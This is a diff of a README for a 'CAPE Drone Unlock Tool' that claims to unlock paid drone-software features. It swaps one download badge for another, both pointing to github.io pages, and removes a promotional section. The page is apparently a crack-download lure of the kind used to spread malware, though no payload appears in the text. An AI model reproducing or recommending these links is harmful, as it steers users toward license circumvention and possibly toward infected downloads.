@@ -5,12 +5,7 @@
 
 <h1 align="center">⚡ CAPE Drone Unlock Tool</h1>
 
-<p align="center">
-  <a href="https://cape-drone-free-download.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20CAPE%20Drone%20Unlock%20Tool-Enable%20All%20Features-00BFFF?style=for-the-badge&logo=drone&logoColor=white" 
-         alt="Download CAPE Drone Unlock Tool" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://andredanielsbjnz.github.io/.github/cape-drone)
 
 <!-- Tool Preview -->
 <p align="center">
@@ -91,13 +86,6 @@ Licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 ## 📚 Support and Contribution
 
 Report bugs or contribute via Issues or Pull Requests.
-
----
-
-## ⭐ Unlock CAPE Drone – Flight Planning & Live Streaming
-
-Unlock all CAPE Drone premium features including mission planning, HD video streaming, and real-time collaboration.  
-[Download the Unlock Tool](https://cape-drone-free-download.github.io/.github/) and optimize your drone operations today.
 
 ---
 
